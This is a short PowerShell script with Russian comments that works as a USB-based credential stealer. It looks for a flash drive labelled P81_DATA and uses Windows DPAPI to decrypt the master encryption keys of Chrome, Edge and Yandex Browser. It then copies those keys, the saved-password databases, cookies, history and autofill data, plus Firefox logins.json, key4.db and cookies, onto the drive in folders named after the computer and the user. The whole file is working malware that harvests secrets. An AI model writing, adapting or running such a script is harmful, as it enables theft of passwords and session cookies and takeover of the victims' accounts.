# 1. Поиск флешки P81_DATA
$u = (Get-Volume -FileSystemLabel "P81_DATA").DriveLetter
if (!$u) { exit }
$usb = "$($u):"

# 2. Идентификация сессии
$pc = $env:COMPUTERNAME
$user = $env:USERNAME
$timestamp = Get-Date -f "yyyyMMdd_HHmm"
$rootDest = "$usb\P81_$($pc)_$($user)_$($timestamp)"
mkdir $rootDest -Force | Out-Null

# 3. Подготовка ключей
Add-Type -AssemblyName System.Security
$report = "$rootDest\KEYS_MANIFEST.txt"

# 4. Список целей (Chromium)
$browsers = @(
    @{n="CHROME"; p="$env:LOCALAPPDATA\Google\Chrome\User Data"},
    @{n="EDGE";   p="$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
    @{n="YANDEX"; p="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    if (Test-Path $b.p) {
        # Создаем папку под конкретный браузер
        $bDest = New-Item -Path $rootDest -Name $b.n -ItemType Directory -Force

        # Ключ дешифровки
        $ls = Join-Path $b.p "Local State"
        if (Test-Path $ls) {
            try {
                $json = Get-Content $ls -Raw | ConvertFrom-Json
                $key = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
                $dec = [Security.Cryptography.ProtectedData]::Unprotect($key[5..($key.Length-1)], $null, 0)
                "[$($b.n)] Key: $([Convert]::ToBase64String($dec))" >> $report
            } catch {}
            Copy-Item $ls -Destination $bDest -Force # Копируем Local State в папку браузера
        }

        # Сбор данных (Пароли, Куки, История)
        $targets = @("Login Data", "Ya Passman Data", "Cookies", "History", "Web Data")
        
        Get-ChildItem -Path $b.p -Include $targets -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            $pName = $_.Directory.Name
            $pDest = New-Item -Path $bDest -Name $pName -ItemType Directory -Force
            
            # Копируем файл
            $targetFile = Join-Path $pDest.FullName $_.Name
            cmd /c copy /y "`"$($_.FullName)`"" "`"$targetFile`"" > $null
        }
    }
}

# 5. Сбор FIREFOX (с сортировкой)
$ffDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffDir) {
    $ffDest = New-Item -Path $rootDest -Name "FIREFOX" -ItemType Directory -Force
    Get-ChildItem $ffDir -Directory | ForEach-Object {
        $pDest = New-Item -Path $ffDest -Name $_.Name -ItemType Directory -Force
        # Для Firefox куки лежат в cookies.sqlite
        $ffFiles = @("logins.json", "key4.db", "cert9.db", "cookies.sqlite", "history.sqlite")
        foreach ($f in $ffFiles) {
            $src = Join-Path $_.FullName $f
            if (Test-Path $src) {
                Copy-Item $src -Destination $pDest.FullName -Force
            }
        }
    }
}

exit
